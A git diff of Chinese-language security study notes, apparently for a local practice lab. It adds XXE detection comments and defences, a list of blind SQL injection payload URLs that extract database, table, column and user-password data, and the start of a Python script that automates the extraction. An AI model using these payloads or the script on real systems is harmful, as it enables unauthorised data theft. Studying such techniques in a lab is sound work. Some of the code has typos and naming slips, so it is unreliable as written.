@@ -1851,6 +1851,16 @@ def output_exec(output,type):
 
 </details>
 
+```
+SimpleHTTPRequestHandler（Python自带HTTP服务器）
+
+            │
+            │继承
+            ▼
+
+        MyHandler（自己修改版）
+```
+
 <details>
 <summary>外部实体注入漏洞_XXE_检测方法</summary>
 
@@ -1878,9 +1888,9 @@ def ExportPayload(lop, lport):
 //编写HTTP服务函数，通过http.server模块实现HTTP服务，监听目标服务器返回的数据
 def StartHTTP(lip,lport):
     serverAddr = (lip, lport)
-    httpd = HTTPServer(serverAddr, MyHandler)
+    httpd = HTTPServer(serverAddr, MyHandler) //创建服务器对象
     print("[*] 正在开启HTTP服务器:\n\n===================\nIP地址：{0}\n端口：{1}\n============\n".format(lip, lport))
-    httpd.serve_forever()
+    httpd.serve_forever()    //让HTTP服务器一直运行，不听等待别人访问
 
 //编写PORT发送函数，用来向目标服务器发送攻击数据
 def SendData(lip, lport, url):
@@ -1894,7 +1904,7 @@ def SendData(lip, lport, url):
         filePath = input("Input filePath:")
 
 class MyHandler(SimpleHTTPRequestHandler):
-    def log_message(self, format, *args):
+    def log_message(self, format, *args):  //重写父类的方法
 
         sys.stderr.write("%s - - [%s] %s\n" %  //终端输出HTTP访问信息
             (self.client_address[0],
@@ -1922,6 +1932,142 @@ if __name__ == '__main__':
 
 //运行
 // # python3 Blind_XXE.py
+```
+
+</details>
+
+<details>
+<summary>外部实体注入漏洞_XXE_防御策略</summary>
+
+```
+[1]默认禁止外部实体的解析
+
+[2]对用户提交的XML数据进行过滤，如关键词 <!DOCTYPE , <!ENTITY, SYSTEM, PUBLIC
+```
+
+</details>
+
+<details>
+<summary>SQL 盲注漏洞</summary>
+
+```
+----------------------------------------------------------------------------
+//基于布尔的盲注：当页面没有回响位、不会输出SQL语句报错信息，通过返回页面响应的正常或不正常的情况进行注入
+
+//基于时间的盲注：当页面没有回响位、不会输出SQL语句报错信息、不论SQL语句的执行结果对错都返回一样的页面时，通过页面的响应时间进行注入
+----------------------------------------------------------------------------
+｜  库  ｜  表  ｜  字段  ｜  数据  ｜  
+
+｜  长度  ｜  名  ｜  数量  ｜
+----------------------------------------------------------------------------
+>>> http://127.0.0.1/sql/Less-8/?id=1' and if(length(database())=8,1,0 %23  //数据库长度
+>>> http://127.0.0.1/sql/Less-8/?id=1' and if(ascii(substr(database(),1,1))=115,1,0) %23  //数据库名
+----------------------------------------------------------------------------
+>>> http://127.0.0.1/sql/Less-8/?id=1' and if((select LENGTH(table_name) from information_schema.tables where table_schem='security' limit 1,1)=8,1,0) %23   //表名称的长度
+>>> http://127.0.0.1/sql/Less-8/?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1), 1, 1))=101,1,0) %23  //表名
+>>> http://127.0.0.1/sql/Less-8/?id=1' and if((select count(*)table_name from information_schema.tables where table_schema='security')=4,1,0) %23     //表的数量
+
+>>> http://127.0.0.1/sql/Less-8/?id=1' and if(ascii(substr((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),1,1))=105,1,0) %23  //获取表的字段
+>>> http://127.0.0.1/sql/Less-8/?id=1' and if((select count(column_name) from information_schema.columns where table_schema='security' and table_name='users' limit')=3,1,0) %23 //表的字段数量
+----------------------------------------------------------------------------
+>>> http://127.0.0.1/sql/Less-8/?id=1' and if((select length(column_name) from information_schema.columns where table_schema='security' and table_name='users' limit 0,1)=2,1,0) %23  //字段的长度
+
+>>> http://127.0.0.1/sql/Less-8/?id=1' and if (ascii(substr((select username from users limit 0,1),1,1))=68,1,0) %23  //获取 字段数据
+>>> http://127.0.0.1/sql/Less-8/?id=1' and if ((select length(username) from users limit 0,1)=4,1,0) %23   //字段数据的长度
+>>> http://127.0.0.1/sql/Less-8/?id=1' and if ((select count(username) from users)=13,1,0) %23    //字段数据的数量
+----------------------------------------------------------------------------
+找数据库
+length(database())
+database()
+----------------------------------------------------------------------------
+找表
+information_schema.tables
+----------------------------------------------------------------------------
+找字段
+information_schema.columns
+----------------------------------------------------------------------------
+读数据
+select username from users
+select password from users
+----------------------------------------------------------------------------
+盲注核心模版
+
+[1]if(条件,1,0)
+
+条件成立 → 返回1,条件不成立 → 返回0
+
+if(length(database())=8,1,0) //数据库名长度是不是8？
+
+ascii(substr(database(),1,1))=115  //数据库第1个字符是不是 s ?
+拆开 database -->   security
+substr(database(),1,1)  -->    s
+ascii('s')  --> 115
+
+ascii(substr(database(),位置,1))=ASCII值
+----------------------------------------------------------------------------
+```
+
+</details>
+
+<details>
+<summary>定义存储数据库的变量_request对象</summary>
+
+```
+!#/usr/bin/python3
+# -*- coding: utf-8 -*-
+
+improt requests
+import optparse
+
+DBName = ""
+DBTable = []
+DBColumns = []
+DBData = {} //{字段名,数据列表}
+
+flag = "You are in ...."  //若页面返回真
+
+# 设置重连次数以及将连接改为短连接
+# 防止 因为HTTP连接次数过多导致的 Max retries exceeded with url 问题
+requests.adapters.DEFAULT_RETRIES = 5
+conn = requests.session()
+conn.keep_alive = False
+
+// 盲注主函数
+def StartSqli(url):
+    GetDBName(url)
+    print("[+] 当前数据库名:{0}".format(DBName))
+    GetDBTables(url,DBName)
+    print("[+]数据库{0}的表如下:".format(DBName))
+
+    for item in range(len(DBTables)):
+        print("(" + str(item + 1) + ")" + DBTables[item])
+    tableIndex = int(input("[*]请输入要查看的表的序号:")) - 1
+    GetDBColumns(url,DBName,DBTables[tableIndex])
+    while True:
+        print("[+] 数据表 {0} 的字段如下:".format(DBTables[tableIndex]))
+        for item in range(len(DBColumns)):
+            print("(" + str(item + 1) + ")" + DBColumns[item])
+        columnIndex = int(input("[*] 请输入要查看的字段的序号(输入0退出):")) - 1
+        if(columnIndex == -1):
+            break
+        else:
+            GetDBData(url, DBTables[tableIndex], DBColumns[columnIndex])
+
+//编写获取数据库的函数，根据得到的URL获取数据库名并把最后的结果存入DBName
+def GetDBName(url):
+    global DBName
+    print("[-] 开始获取数据库名的长度")
+    DBNameLen = 0
+    payload = "' and if(length(database())={0},1,0) %23"
+    targetUrl = url + payload
+    for DBNameLen in range(1, 99):
+        res = conn.get(targetUrl.format(DBNameLen))
+        if flag in res.content.decode("utf-8"):
+            print("[+]数据库名的长度:" + str(DBNameLen))
+            break
+    print("[-]开始获取数据库名")
+    payload = "'and if(ascii(substr(database(),{0},1))={1},1,0) %23"
+    targetUrl = url + payload
 ```
 
 </details>
